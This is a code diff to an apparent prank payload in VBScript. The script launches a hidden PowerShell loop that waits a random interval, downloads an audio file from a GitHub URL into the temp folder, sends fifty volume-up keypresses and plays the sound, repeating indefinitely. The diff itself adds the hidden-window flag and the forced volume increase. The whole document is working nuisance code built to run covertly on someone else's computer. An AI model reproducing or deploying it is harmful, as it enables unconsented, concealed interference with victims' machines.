@@ -1,17 +1,4 @@
-command = " " & _
-          " $URL = \"https://raw.githubusercontent.com/msr8/attiny85/main/Assets/yamete-kudasai.wav\" " & _
-          " $FP  = \"$env:TEMP\15791817.wav\" " & _
-          " $MINTIME = 600  # 10 minutes " & _
-          " $MAXTIME = 3600 # 1 hour " & _
-          " " & _
-          " while ($true) { " & _
-          "     $waitTime = Get-Random -Minimum $MINTIME -Maximum $MAXTIME " & _
-          "     Start-Sleep -Seconds $waitTime " & _
-          "     if (!(Test-Path $FP)) { " & _
-          "         Invoke-WebRequest $URL -OutFile $FP " & _
-          "     } " & _
-          "     (New-Object System.Media.SoundPlayer($FP)).PlaySync() " & _
-          " } "
+command = "$URL = \" & chr(34) & "https://raw.githubusercontent.com/msr8/attiny85/main/Assets/yamete-kudasai.wav\" & chr(34) & "; $FP  = \" & chr(34) & "$env:TEMP\15791817.wav\" & chr(34) & "; $MINTIME = 600; $MAXTIME = 3600; while ($true) { $waitTime = Get-Random -Minimum $MINTIME -Maximum $MAXTIME; Start-Sleep -Seconds $waitTime; if (!(Test-Path $FP)) {Invoke-WebRequest $URL -OutFile $FP}; $wshShell = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object {$wshShell.SendKeys([char]175)}; (New-Object System.Media.SoundPlayer($FP)).PlaySync() }"
 
 Set objShell = CreateObject("Wscript.shell")
-objShell.run("powershell.exe  -command " & command)
+objShell.run("powershell.exe -command " & command, 0)
